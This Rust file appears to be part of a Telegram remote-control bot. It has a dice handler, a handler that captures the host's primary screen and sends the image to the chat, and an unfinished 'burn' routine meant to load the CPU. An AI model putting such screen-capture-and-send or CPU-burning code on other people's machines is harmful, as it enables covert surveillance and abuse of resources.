




   
// https://github.com/teloxide/teloxide/tree/dev/examples
// https://github.com/TeXitoi/structopt




use cmd; //-- to use lib.rs windows commands
use chrono::{DateTime, Duration, NaiveDateTime, Utc};
use teloxide::types::InputFile;
use crate::handlers::schemas::cpu::Burn;
use crate::handlers::schemas::ram::Inject;
use teloxide::prelude::*;
use scrap::{Capturer, Display};
use std::io::ErrorKind::WouldBlock;
use std::fs::File;
use std::fs;
use log::{error, info};
use std::thread;
use std::time::Duration as stDuration;
use repng;
use std::path::PathBuf;






pub const name: &'static str = "K4TyUsh4";





pub async fn roll(bot: UpdateWithCx<AutoSend<Bot>, Message>){ 
    bot.answer_dice().await;
}




pub async fn shot(bot: UpdateWithCx<AutoSend<Bot>, Message>){
    let one_second = stDuration::new(1, 0);
    let one_frame = one_second / 60;
    let display = Display::primary().expect("Couldn't find primary display");
    let mut capturer = Capturer::new(display).expect("couldn't begin capture.");
    let (w, h) = (capturer.width(), capturer.height());
    loop{
        let buffer = match capturer.frame() {
            Ok(buffer) => buffer,
            Err(error) => {
                if error.kind() == WouldBlock {
                    thread::sleep(one_frame);
                    continue;
                } else {
                    panic!("Error: {}", error);
                }
            }
        };
        bot.answer("Captured! Sending...").await;
        repng::encode(
            File::create("screenshot.png").unwrap(),
            w as u32,
            h as u32,
            &buffer,
        ).unwrap();
        info!("Image saved to screenshot.png");
        break;
    }
    if let Ok(bytes) = fs::read("screenshot.png"){
        // NOTE - an image is an array of u32 or u64 bytes saved in a buffer which contains flattened pixels value between range 0 to 255
        // ...
        info!("Screenshot bytes => {:?}", bytes);
    }
    let mut path = PathBuf::new();
    path.push(r"screenshot.png");
    bot.answer_photo(InputFile::File(path)).await;

}






pub async fn burn(bot: UpdateWithCx<AutoSend<Bot>, Message>){
    // TODO - make CPU burn
    // TODO - reply CPU info status
    // ... 
}
